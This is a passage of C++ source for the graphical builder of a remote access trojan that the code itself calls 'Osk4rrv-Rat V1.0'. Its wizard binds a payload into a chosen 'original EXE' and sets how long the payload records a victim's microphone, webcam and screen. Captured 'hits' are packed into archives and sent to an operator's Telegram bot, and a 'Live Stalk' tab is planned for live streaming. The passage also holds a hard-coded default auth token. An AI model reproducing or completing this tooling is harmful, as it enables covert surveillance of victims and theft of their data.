                const float fieldW = 420.0f;
                float pathW = fieldW - browseW - gap;
                if (pathW < 120.0f) pathW = 120.0f;
                ImGui::SetNextItemWidth(pathW);
                ImGui::InputText("##exe_path", selectedExePath, MAX_PATH, ImGuiInputTextFlags_ReadOnly);
                ImGui::SameLine(0.0f, gap);
                char browseLabel[64];
                snprintf(browseLabel, sizeof(browseLabel), "%s  Browse", ICON_FA_FOLDER_OPEN);
                if (styledButton(browseLabel, ImVec2(browseW, 36.0f), true))
                    openExeFileDialog();
            }

            ImGui::Dummy(ImVec2(0.0f, 12.0f));
            if (strlen(selectedExePath) > 0) {
                ImGui::PushStyleColor(ImGuiCol_Text, Ui::Success);
                if (fontIcons) {
                    ImGui::PushFont(fontIcons, fontIcons->LegacySize);
                    ImGui::TextUnformatted(ICON_FA_CHECK);
                    ImGui::PopFont();
                    ImGui::SameLine(0.0f, 8.0f);
                }
                ImGui::Text("%s", selectedExeName);
                ImGui::PopStyleColor();
            } else {
                ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
                ImGui::TextUnformatted("No .exe selected yet.");
                ImGui::PopStyleColor();
            }
        } else {
            // Options step - same left layout style
            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_GEAR, "Features");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();
            ImGui::Dummy(ImVec2(0.0f, 6.0f));

            for (int i = 0; i < 11; ++i)
                styledCheckbox(buildOptionLabels[i], &buildOptions[i]);

            ImGui::Dummy(ImVec2(0.0f, 12.0f));
            ImGui::Separator();
            ImGui::Dummy(ImVec2(0.0f, 12.0f));

            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_CLOCK, "Capture durations (seconds)");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();
            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextWrapped("Longer times = larger archive and slower Telegram upload.");
            ImGui::PopStyleColor();
            ImGui::Dummy(ImVec2(0.0f, 6.0f));

            ImGui::SetNextItemWidth(180.0f);
            ImGui::InputInt("Microphone (sec)##mic_dur", &micDurationSec);
            ImGui::SetNextItemWidth(180.0f);
            ImGui::InputInt("Webcam (sec)##cam_dur", &webcamDurationSec);
            ImGui::SetNextItemWidth(180.0f);
            ImGui::InputInt("Screen record (sec)##scr_dur", &screenDurationSec);

            ImGui::Dummy(ImVec2(0.0f, 12.0f));
            ImGui::Separator();
            ImGui::Dummy(ImVec2(0.0f, 12.0f));

            // === Archive password ===
            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_LOCK, "Archive password");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();
            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextWrapped("Off: a random password is generated per hit. "
                "On with an empty field: the archive has no password.");
            ImGui::PopStyleColor();
            ImGui::Dummy(ImVec2(0.0f, 6.0f));

            styledCheckbox("Configure password", &useCustomPassword);

            // The field only appears once the option is on, so the default flow
            // (random password) keeps a clean, uncluttered options page.
            if (useCustomPassword) {
                ImGui::Dummy(ImVec2(0.0f, 6.0f));
                ImGui::SetNextItemWidth(300.0f);
                ImGui::InputTextWithHint("##custom_pw", "Leave empty for no password",
                    customPasswordBuf, sizeof(customPasswordBuf));
                if (customPasswordBuf[0] == '\0') {
                    ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
                    ImGui::TextUnformatted("No password will be set on the archive.");
                    ImGui::PopStyleColor();
                }
            }

            if (!ImGui::IsAnyItemActive()) {
                if (micDurationSec < 1) micDurationSec = 1;
                if (micDurationSec > 600) micDurationSec = 600;
                if (webcamDurationSec < 1) webcamDurationSec = 1;
                if (webcamDurationSec > 600) webcamDurationSec = 600;
                if (screenDurationSec < 1) screenDurationSec = 1;
                if (screenDurationSec > 600) screenDurationSec = 600;
            }

            ImGui::Dummy(ImVec2(0.0f, 12.0f));
            ImGui::Separator();
            ImGui::Dummy(ImVec2(0.0f, 12.0f));

            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_SLIDERS, "Update interval");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextUnformatted("Days between info updates (0 = only on change)");
            ImGui::PopStyleColor();
            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::SetNextItemWidth(320.0f);
            ImGui::SliderInt("##update_slider", &updateIntervalDays, 0, 30, "%d days");
        }

        ImGui::EndChild();

        // Footer: Exit left, primary right
        const float btnH = 36.0f;
        const float btnY = winSize.y - footerH + 12.0f;
        const float leftX = 28.0f;
        const float rightEdge = winSize.x - 28.0f;

        if (buildWizardStep == 0) {
            const float contW = 130.0f;
            const float exitW = 140.0f;
            const bool hasExe = strlen(selectedExePath) > 0;

            ImGui::SetCursorPos(ImVec2(leftX, btnY));
            char exitLabel[64];
            snprintf(exitLabel, sizeof(exitLabel), "%s  Exit to home", ICON_FA_HOUSE);
            if (styledButton(exitLabel, ImVec2(exitW, btnH), false))
                closeBuildWizard(true);

            ImGui::SetCursorPos(ImVec2(rightEdge - contW, btnY));
            if (!hasExe)
                ImGui::BeginDisabled();
            char contLabel[64];
            snprintf(contLabel, sizeof(contLabel), "%s  Continue", ICON_FA_ARROW_RIGHT);
            if (styledButton(contLabel, ImVec2(contW, btnH), true))
                goBuildWizardStep(1);
            if (!hasExe)
                ImGui::EndDisabled();
        } else {
            const float buildW = 120.0f;
            const float backW = 110.0f;
            const float exitW = 140.0f;
            const float gap = 10.0f;

            ImGui::SetCursorPos(ImVec2(leftX, btnY));
            char backLabel[64];
            snprintf(backLabel, sizeof(backLabel), "%s  Back", ICON_FA_ARROW_LEFT);
            if (styledButton(backLabel, ImVec2(backW, btnH), false))
                goBuildWizardStep(0);

            ImGui::SameLine(0.0f, gap);
            char exitLabel[64];
            snprintf(exitLabel, sizeof(exitLabel), "%s  Exit to home", ICON_FA_HOUSE);
            if (styledButton(exitLabel, ImVec2(exitW, btnH), false))
                closeBuildWizard(true);

            ImGui::SetCursorPos(ImVec2(rightEdge - buildW, btnY));
            char buildLabel[64];
            const bool building = g_buildRunning.load();
            if (building) {
                snprintf(buildLabel, sizeof(buildLabel), "%s  Building...", ICON_FA_HAMMER);
            } else {
                snprintf(buildLabel, sizeof(buildLabel), "%s  Build", ICON_FA_HAMMER);
            }
            // Building is disabled while a build is in flight so the worker never
            // races with a second click.
            ImGui::BeginDisabled(building);
            if (styledButton(buildLabel, ImVec2(buildW, btnH), true)) {
                dbgLog("Build clicked: exe='%s' token_len=%zu chat_len=%zu",
                    selectedExePath, strlen(botTokenBuf), strlen(chatIdBuf));
                startBuildAsync();
            }
            ImGui::EndDisabled();

            // Collect the result of a finished async build exactly once.
            if (g_buildDone.exchange(false)) {
                dbgLog("performBuild done: msg='%s'", buildStatusMsg);
                if (strstr(buildStatusMsg, "Build OK") != nullptr)
                    goBuildWizardStep(2);
            }
        }
    }

    ImGui::PopStyleVar(); // alpha

    // Chrome last so hit-test wins
    if (drawChromeButton("##buildwiz_min", ImVec2(p0.x + winSize.x - 78.0f, p0.y + 14.0f), false))
        requestMinimize = true;
    if (drawChromeButton("##buildwiz_close", ImVec2(p0.x + winSize.x - 40.0f, p0.y + 14.0f), true))
        requestClose = true;
}

static void drawBuildTab() {
    const float width = ImGui::GetWindowSize().x;
    drawPageHeader("Build", "Package payload into an executable");

    // Setup card — text top-left, Configure button lower-right inside same box
    {
        const float panelW = width - Ui::ContentPadding * 2.0f;
        const float padX = 20.0f;
        const float padY = 14.0f;
        const float btnW = 100.0f;
        const float btnH = 32.0f;
        const float panelH = 118.0f;

        ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(padX, padY));
        ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
        ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
        ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
        if (ImGui::BeginChild(
                "##build_config",
                ImVec2(panelW, panelH),
                ImGuiChildFlags_Borders,
                ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::TextUnformatted("Setup");
            if (fontMedium) ImGui::PopFont();
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextUnformatted("Pick original EXE, features and durations.");
            ImGui::PopStyleColor();

            // Show current selection so the card always reflects real state.
            if (strlen(selectedExeName) > 0) {
                ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextSecondary);
                ImGui::Text("Selected: %s", selectedExeName);
                ImGui::PopStyleColor();
            } else {
                ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
                ImGui::TextUnformatted("No original .exe selected yet.");
                ImGui::PopStyleColor();
            }

            const float contentW = ImGui::GetWindowContentRegionMax().x - ImGui::GetWindowContentRegionMin().x;
            const float contentH = ImGui::GetWindowContentRegionMax().y - ImGui::GetWindowContentRegionMin().y;
            ImGui::SetCursorPos(ImVec2(contentW - btnW, contentH - btnH));
            if (styledButton("Configure", ImVec2(btnW, btnH), true)) {
                buildWizardStep = 0;
                buildWizardStepFrom = 0;
                buildWizardStepAnim = 1.0f;
                showBuildPopup = true;
                dbgLog("Configure clicked -> showBuildPopup=%d", (int)showBuildPopup);
            }
        }
        ImGui::EndChild();
        ImGui::PopStyleColor(2);
        ImGui::PopStyleVar(2);
    }

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 200.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##build_debug",
            ImVec2(width - Ui::ContentPadding * 2.0f, 200.0f),
            ImGuiChildFlags_Borders,
            0)) {
        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Test");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Send a test hit to Telegram.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 10.0f));

        if (styledButton("Send test", ImVec2(110.0f, 36.0f), true)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                sendTestHit();
                showNotConfiguredWarning = false;
            } else {
                showNotConfiguredWarning = true;
            }
        }

        const StatusPresentation status = getStatusPresentation();
        if (telegram.getStatus() != TelegramStatus::Idle) {
            ImGui::SameLine(0.0f, 12.0f);
            ImGui::PushStyleColor(ImGuiCol_Text, status.color);
            ImGui::TextUnformatted(status.label);
            ImGui::PopStyleColor();
        }
        if (showNotConfiguredWarning) {
            ImGui::SameLine(0.0f, 12.0f);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::Warning);
            ImGui::TextUnformatted("Set Telegram first");
            ImGui::PopStyleColor();
        }

        // Show the last build result so a failed build is never silent.
        if (buildStatusMsg[0] != '\0') {
            ImGui::Dummy(ImVec2(0.0f, 8.0f));
            const bool ok = strstr(buildStatusMsg, "Build OK") != nullptr;
            ImGui::PushStyleColor(ImGuiCol_Text, ok ? Ui::Success : Ui::Danger);
            ImGui::PushTextWrapPos(ImGui::GetWindowContentRegionMax().x);
            ImGui::TextWrapped("%s", buildStatusMsg);
            ImGui::PopTextWrapPos();
            ImGui::PopStyleColor();
        }
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

// "Live Stalk" — placeholder for a real-time view of a connected session.
//
// Deliberately a "Coming Soon" panel: the transport for live frames is not part
// of this build, and shipping a dead button would be worse than an honest
// placeholder. The panel states what the feature will do so the tab is not
// empty, without pretending it already works.
static void drawLiveStalkTab() {
    const float width = ImGui::GetWindowSize().x;
    drawPageHeader("Live Stalk", "Real-time session view");

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##livestalk_tab",
            ImVec2(width - Ui::ContentPadding * 2.0f, 300.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        const ImVec2 panelSize = ImGui::GetWindowSize();

        // Centered "Coming Soon" badge block.
        const char* title = "Coming Soon";
        ImFont* titleFont = fontHeading ? fontHeading : ImGui::GetFont();
        const ImVec2 titleSize = titleFont->CalcTextSizeA(
            titleFont->LegacySize, FLT_MAX, 0.0f, title);

        const char* sub = "Live screen and webcam streaming will appear here.";
        ImFont* subFont = fontMedium ? fontMedium : ImGui::GetFont();
        const ImVec2 subSize = subFont->CalcTextSizeA(
            subFont->LegacySize, FLT_MAX, 0.0f, sub);

        const float blockH = titleSize.y + 12.0f + subSize.y;
        const float startY = (panelSize.y - blockH) * 0.5f;

        ImGui::SetCursorPos(ImVec2(0.0f, startY));
        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
        ImGui::SetCursorPosX((panelSize.x - titleSize.x) * 0.5f);
        ImGui::TextUnformatted(title);
        ImGui::PopStyleColor();
        if (fontHeading) ImGui::PopFont();

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        // Center the subtitle as well so the block reads as one unit.
        const float subLineY = startY + titleSize.y + 12.0f;
        ImGui::SetCursorPos(ImVec2((panelSize.x - subSize.x) * 0.5f, subLineY));
        ImGui::TextUnformatted(sub);
        ImGui::PopStyleColor();
        if (fontMedium) ImGui::PopFont();
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

static void drawEndpointTab() {
    const ImVec2 contentSize = ImGui::GetWindowSize();
    drawPageHeader("Endpoint", "Telegram bot delivery endpoint");

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    // 220px hugs the content (header block + divider + three status rows ≈ 195px).
    // It was 300px, which left ~115px of dead space once the divider stopped being
    // pinned 23px lower than the header actually needed.
    if (ImGui::BeginChild(
            "##endpoint_tab",
            ImVec2(contentSize.x - Ui::ContentPadding * 2.0f, 220.0f),
            ImGuiChildFlags_Borders,
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {

        // === TELEGRAM CONFIG SECTION ===
        // The header block is measured first so the action buttons can be centred
        // against its real height instead of a guessed Y.
        const float padX = ImGui::GetCursorPosX();
        const float headerTop = ImGui::GetCursorPosY();
        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Telegram Configuration");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Bot delivery endpoint settings.");
        ImGui::PopStyleColor();
        const float headerBottom = ImGui::GetCursorPosY() - ImGui::GetStyle().ItemSpacing.y;

        // Header action row: Connect + Configure, right-aligned.
        //
        // ImGui::Button(label, size) is exactly `size` wide — FramePadding only
        // positions the label inside that box, it does not add to the width. The
        // previous code reserved W + 24 per button on the assumption that it did,
        // so the pair drifted apart with a gap far wider than the intended 10px
        // instead of sitting neatly against the panel edge.
        const float headerGap = 10.0f;
        const float buttonH = 34.0f;
        const float connectW = 96.0f, configureW = 118.0f;
        const float contentRight = ImGui::GetContentRegionMax().x;
        const float configureX = contentRight - configureW;
        const float connectX = configureX - headerGap - connectW;

        // Vertically centred on the title/subtitle block, so the buttons read as
        // the header's actions rather than as a second row under it.
        const float buttonY = headerTop + (headerBottom - headerTop - buttonH) * 0.5f;

        ImGui::SetCursorPos(ImVec2(connectX, buttonY));
        if (styledButton("Connect", ImVec2(connectW, buttonH), false)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                telegram.verifyConnectionAsync();
            }
        }
        // "Configure" opens the setup wizard. Previously labelled "Save"/"Setup"
        // depending on whether a config had been loaded, which read like a second
        // save action next to the Save buttons in Settings.
        ImGui::SetCursorPos(ImVec2(configureX, buttonY));
        if (styledButton("Configure", ImVec2(configureW, buttonH), true))
            showTelegramPopup = true;

        // Divider under the header block, at a Y derived from the header rather
        // than the old hardcoded 103.
        ImGui::SetCursorPos(ImVec2(padX, headerBottom + 20.0f));
        ImGui::Separator();
        ImGui::Dummy(ImVec2(0.0f, 12.0f));

        const StatusPresentation status = getStatusPresentation();

        // Telegram status
        drawInfoRow("Telegram", status.label, status.color);

        // Bot token state
        const bool tokenSet = strlen(botTokenBuf) > 0;
        drawInfoRow("Bot Token", tokenSet ? "Configured" : "Missing",
            tokenSet ? Ui::TextSecondary : Ui::TextMuted);

        // Chat ID state
        const bool chatSet = strlen(chatIdBuf) > 0;
        drawInfoRow("Chat ID", chatSet ? "Configured" : "Missing",
            chatSet ? Ui::TextSecondary : Ui::TextMuted);
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

static void drawSettingsTab() {
    const ImVec2 contentSize = ImGui::GetWindowSize();
    drawPageHeader("Settings", "Application authentication");

    // The panel fills whatever is left under the page header and scrolls when its
    // content does not fit. At the default 760x500 window only ~292px is available
    // here while the form needs ~500px, so the old fixed 430px panel simply ran off
    // the bottom with no way to reach the Startup section.
    //
    // Clamped with a ternary rather than std::max(): <windows.h> (pulled in by
    // shlobj.h) defines min/max as macros, which breaks qualified std::max calls.
    const float availableH = contentSize.y - 88.0f - Ui::ContentPadding;
    const float panelH = availableH > 180.0f ? availableH : 180.0f;

    ImGui::SetCursorPos(ImVec2(Ui::ContentPadding, 88.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(18.0f, 16.0f));
    ImGui::PushStyleColor(ImGuiCol_ChildBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::Border);
    if (ImGui::BeginChild(
            "##settings_tab",
            ImVec2(contentSize.x - Ui::ContentPadding * 2.0f, panelH),
            ImGuiChildFlags_Borders,
            0)) {

        // === APP AUTH TOKEN SECTION ===
        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("App Auth Token");
        if (fontMedium) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Token required to unlock the builder at startup.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 8.0f));

        // Show/hide toggle for the token field.
        //
        // ImGui::Button(label, size) is exactly `size` wide — FramePadding only
        // positions the label inside that box, it does not add to it. The old code
        // reserved an extra 24px per button on the assumption that it did, which
        // left the field and the action row short of the panel edge. Everything is
        // sized from real widths now.
        static bool showAuthToken = false;
        // Content width excluding the scrollbar, so the row still ends flush once
        // the panel starts scrolling.
        const float contentW = ImGui::GetContentRegionMax().x;
        const float showW = 80.0f;
        const float gap = 8.0f;

        ImGui::SetNextItemWidth(contentW - showW - gap);
        ImGui::InputText("##app_auth_input", authTokenBuf, sizeof(authTokenBuf),
            showAuthToken ? 0 : ImGuiInputTextFlags_Password);
        ImGui::SameLine(0.0f, gap);
        if (styledButton(showAuthToken ? "Hide" : "Show", ImVec2(showW, 32.0f), false))
            showAuthToken = !showAuthToken;

        // Tight gap: these two actions belong with the field above them, and a
        // large spacer here read as if they were a separate section.
        ImGui::Dummy(ImVec2(0.0f, 2.0f));

        // Action row. "Reset to default" is only drawn when both buttons plus the
        // gap genuinely fit, so the pair can never wrap into a column.
        const float saveW = 120.0f, resetW = 150.0f;
        {
            ImGui::BeginGroup();
            if (styledButton("Save token", ImVec2(saveW, 34.0f), true)) {
                if (strlen(authTokenBuf) > 0) {
                    saveConfigToAppData();
                    authTokenSavedOk = true;
                    authTokenSavedAt = (float)ImGui::GetTime();
                } else {
                    authTokenSavedOk = false;
                }
            }
            if (saveW + 10.0f + resetW <= contentW) {
                ImGui::SameLine(0.0f, 10.0f);
                if (styledButton("Reset to default", ImVec2(resetW, 34.0f), false)) {
                    strncpy_s(authTokenBuf, "sk-7nR9pL2mK8qW5vT3", sizeof(authTokenBuf) - 1);
                    saveConfigToAppData();
                    authTokenSavedOk = true;
                    authTokenSavedAt = (float)ImGui::GetTime();
                }
            }
            ImGui::EndGroup();
        }

        // Confirmation hint in a reserved slot, so showing or hiding it never
        // moves the sections below.
        const float hintTop = ImGui::GetCursorPosY();
        if (authTokenSavedOk && (float)ImGui::GetTime() - authTokenSavedAt < 3.0f) {
            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::Success);
            ImGui::TextUnformatted("Saved");
            ImGui::PopStyleColor();
        }
        ImGui::SetCursorPosY(hintTop + 4.0f + ImGui::GetTextLineHeight() + 6.0f);

        // Divider between the token form and the read-only status rows.
        //
        // Submitted as a Separator rather than a draw-list line: a draw-list line
        // is placed in window coordinates, so it would stay pinned while the
        // content scrolled underneath it. Separator() is a real item, follows the
        // scroll offset, and stops before the scrollbar.
        ImGui::Separator();
        ImGui::Dummy(ImVec2(0.0f, 10.0f));

        // Auth status. Reflects the Disable app auth toggle, so "Disabled" is
        // shown rather than a misleading "Active" once the guard is turned off.
        const char* authStateLabel = disableAppAuth ? "Disabled" : (authLoggedIn ? "Active" : "Inactive");
        const ImVec4 authStateColor = disableAppAuth ? Ui::TextMuted
            : (authLoggedIn ? Ui::Success : Ui::Danger);
        drawInfoRow("Auth Status", authStateLabel, authStateColor);

        // Token source
        const char* srcState = authTokenIsDefault ? "Default" : "Custom";
        drawInfoRow("Token Source", srcState, authTokenIsDefault ? Ui::TextMuted : Ui::Accent);

        // Storage location
        drawInfoRow("Storage", "config.ini", Ui::TextSecondary);

        // === STARTUP SECTION ===
        ImGui::Dummy(ImVec2(0.0f, 12.0f));
        ImGui::Separator();
        ImGui::Dummy(ImVec2(0.0f, 10.0f));

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
        ImGui::TextUnformatted("Startup");
        ImGui::PopStyleColor();
        if (fontMedium) ImGui::PopFont();

        ImGui::Dummy(ImVec2(0.0f, 10.0f));

        // Row 1: Auto connect. Verify the bot as soon as the app opens, so the
        // Telegram status is live without pressing Connect every launch.
        //
        // No SetCursorPos here: styledToggleRow() positions itself off the current
        // cursor Y, which keeps the rows flowing (and scrolling) correctly.
        if (styledToggleRow("##toggle_autoconnect", "Auto connect on application start",
                &autoConnectOnStart, "Verify the Telegram bot when the app opens")) {
            saveConfigToAppData();
        }

        // Row 2: Disable app auth. Skips the token login screen entirely — the
        // token stays stored, it is just no longer required to get in.
        if (styledToggleRow("##toggle_disableauth", "Disable app auth",
                &disableAppAuth, "Open the builder without the token prompt")) {
            // Turning the guard off while signed out must not strand the UI on
            // the login screen; treat it as an immediate pass-through.
            if (disableAppAuth) {
                authLoggedIn = true;
                authCheckDone = true;
                showAuthLogin = false;
            }
            saveConfigToAppData();
        }
    }
    ImGui::EndChild();
    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar();
}

static void drawTelegramPopup() {
    if (!showTelegramPopup)
        return;

    ImGui::OpenPopup("Telegram setup##modal");
    const ImVec2 center = ImGui::GetMainViewport()->GetCenter();
    ImGui::SetNextWindowPos(center, ImGuiCond_Appearing, ImVec2(0.5f, 0.5f));
    ImGui::SetNextWindowSize(ImVec2(560.0f, 478.0f), ImGuiCond_Appearing);

    ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(28.0f, 25.0f));
    ImGui::PushStyleVar(ImGuiStyleVar_WindowRounding, 12.0f);
    ImGui::PushStyleColor(ImGuiCol_PopupBg, Ui::Surface);
    ImGui::PushStyleColor(ImGuiCol_Border, Ui::BorderStrong);

    if (ImGui::BeginPopupModal(
            "Telegram setup##modal",
            &showTelegramPopup,
            ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoMove |
            ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
        const ImVec2 startCursor = ImGui::GetCursorPos();
        const ImVec2 popupPos = ImGui::GetWindowPos();
        const ImVec2 popupSize = ImGui::GetWindowSize();

        if (drawChromeButton(
                "##close_telegram_modal",
                ImVec2(popupPos.x + popupSize.x - 66.0f, popupPos.y + 25.0f),
                true)) {
            showTelegramPopup = false;
            ImGui::CloseCurrentPopup();
        }
        ImGui::SetCursorPos(startCursor);

        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
        ImGui::TextUnformatted("Telegram setup");
        if (fontHeading) ImGui::PopFont();
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Configure delivery without leaving the app.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 13.0f));
        ImGui::Separator();
        ImGui::Dummy(ImVec2(0.0f, 13.0f));

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Bot token");
        if (fontMedium) ImGui::PopFont();
        ImGui::Dummy(ImVec2(0.0f, 4.0f));
        ImGui::SetNextItemWidth(-1.0f);
        ImGui::InputText("##token", botTokenBuf, sizeof(botTokenBuf), ImGuiInputTextFlags_Password);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Create or copy it from @BotFather.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 11.0f));

        if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
        ImGui::TextUnformatted("Chat ID");
        if (fontMedium) ImGui::PopFont();
        ImGui::Dummy(ImVec2(0.0f, 4.0f));
        ImGui::SetNextItemWidth(-1.0f);
        ImGui::InputText("##chatid", chatIdBuf, sizeof(chatIdBuf));
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted("Use @userinfobot to find the destination ID.");
        ImGui::PopStyleColor();

        ImGui::Dummy(ImVec2(0.0f, 16.0f));
        const float buttonGap = 10.0f;
        const float resetWidth = 92.0f;
        const float connectWidth = 112.0f;
        const float testWidth = 112.0f;
        const float saveWidth = ImGui::GetContentRegionAvail().x - resetWidth - connectWidth - testWidth - buttonGap * 3.0f;
        if (styledButton("Reset", ImVec2(resetWidth, 40.0f), false))
            resetConfig();
        ImGui::SameLine(0.0f, buttonGap);
        if (styledButton("Connect", ImVec2(connectWidth, 40.0f), false)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                telegram.verifyConnectionAsync();
            }
        }
        ImGui::SameLine(0.0f, buttonGap);
        if (styledButton("Send test", ImVec2(testWidth, 40.0f), false)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0) {
                telegram.setConfig(botTokenBuf, chatIdBuf);
                // Verbatim on purpose: sendMessageAsync() would stamp the
                // "[Osk4rrv-Rat V1.0] / Session ID: <id>" header on top, and the
                // test is meant to read as the payload's own connect line.
                char testMsg[256];
                snprintf(testMsg, sizeof(testMsg),
                    "Connected with session: %s \xe2\x9c\x85", sessionId.c_str());
                telegram.sendRawMessageAsync(testMsg);
            }
        }
        ImGui::SameLine(0.0f, buttonGap);
        if (styledButton("Save configuration", ImVec2(saveWidth, 40.0f), true)) {
            if (strlen(botTokenBuf) > 0 && strlen(chatIdBuf) > 0)
                saveConfigToAppData();
        }

        const StatusPresentation status = getStatusPresentation();
        if (telegram.getStatus() != TelegramStatus::Idle) {
            ImGui::PushStyleColor(ImGuiCol_Text, status.color);
            ImGui::TextUnformatted(status.label);
            ImGui::PopStyleColor();
        }

        ImGui::EndPopup();
    }

    ImGui::PopStyleColor(2);
    ImGui::PopStyleVar(2);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int) {
    sessionId = generateSessionId();
    telegram.setSessionId(sessionId);

    WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L,
        hInstance, nullptr, nullptr, nullptr, nullptr, L"AppBuilder", nullptr };
    RegisterClassExW(&wc);

    // Enable per-monitor DPI awareness for sharp rendering on high-DPI displays
